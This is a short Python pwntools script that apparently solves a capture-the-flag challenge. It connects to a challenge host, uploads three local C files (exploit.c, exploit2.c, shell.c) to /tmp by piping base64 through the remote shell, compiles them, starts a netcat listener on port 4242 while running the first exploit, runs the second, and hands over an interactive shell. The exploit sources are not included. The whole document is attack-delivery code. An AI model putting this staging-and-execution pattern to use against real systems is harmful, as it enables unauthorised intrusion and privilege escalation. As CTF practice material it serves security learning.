from pwn import *
from base64 import b64encode

r = remote("pwn.chall.pwnoh.io", "13383")
# r = remote("localhost", "1337")

r.recvuntil("bash-5.0$")

def sendfile(filename):
    with open(filename, "rb") as f:
        a = f.read()
        cmd = 'echo "{}" | base64 -d > "{}"'.format(
                b64encode(a).decode(),
                "/tmp/"+filename
        )
        r.sendline(cmd)

sendfile("exploit.c")
sendfile("exploit2.c")
sendfile("shell.c")
r.sendline("cd /tmp")
r.sendline("export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin")
r.sendline("gcc -o exploit exploit.c")
r.sendline("gcc -o exploit2 exploit2.c")
r.sendline("gcc -o xx shell.c")
r.sendline("./exploit 1>&2 & nc.openbsd -l 4242")
r.sendline("cd /tmp && ./exploit2")
r.interactive()
